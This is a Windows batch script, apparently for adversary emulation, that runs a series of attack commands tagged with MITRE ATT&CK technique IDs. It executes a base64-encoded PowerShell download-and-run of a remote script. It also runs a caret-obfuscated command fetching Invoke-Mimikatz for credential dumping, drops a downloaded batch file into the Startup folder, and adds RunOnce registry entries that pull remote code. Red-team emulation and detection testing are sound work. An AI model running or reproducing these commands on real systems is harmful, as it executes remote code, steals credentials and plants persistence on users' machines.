@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Obfuscated Files or Information	(T1027)
ECHO.
ECHO [+] Obfuscated Powershell payload execution (T1027 - T1082)
ECHO -------------------------------------------------------------------
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZwByAGUAeQBjAGUAbAAvAHAAbwBjAC8AbQBhAHMAdABlAHIALwBEAGkAcwBjAG8AdgBlAHIAeQBTAHkAcwBJAG4AZgBvAC4AdAB4AHQAIgApAA==
ECHO -------------------------------------------------------------------
::Payload: 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/greycel/poc/master/DiscoverySysInfo.txt")'
ECHO.




ECHO [+] Using powershell obfuscated string
ECHO -------------------------------------------------------------------
cmd.exe /c pow^eRSheLL^.eX^e ^-e^x^ec^u^tI^o^nP^OLIcY^ ByP^a^S^s -nOProf^I^L^e^ ^(ne^w-O^BJe^c^T ^SY^STeM.Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDstr^ing(^'^h^t^t^p://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
ECHO.






[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $URL="https://raw.githubusercontent.com/greycel/poc/master/collect.bat";$FileName="APT19.bat";$webclient=New-Object System.Net.WebClient;$file="$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$FileName";$webclient.DownloadFile($URL,"$file");


T1086	PowerShell 
T1027	Obfuscated Files or Information
T1143	Hidden Window
T1060	Registry Run Keys / Startup Folder
-------------------------------------------------
powershell -windowstyle hidden -ep bypass $RunOnceKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; New-ItemProperty -path $RunOnceKey -Name "NextRun" -PropertyType String -value 'powershell.exe "IEX (New-Object Net.WebClient).Downloadfile("https://github.com/greycel/poc/blob/master/collect.bat")"';Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
-------------------------------------------------




T1112	Modify Registry
----------------------------------
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /t REG_SZ /v NextRun /d "C:\Window\System32\cmd.exe" /f
$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\









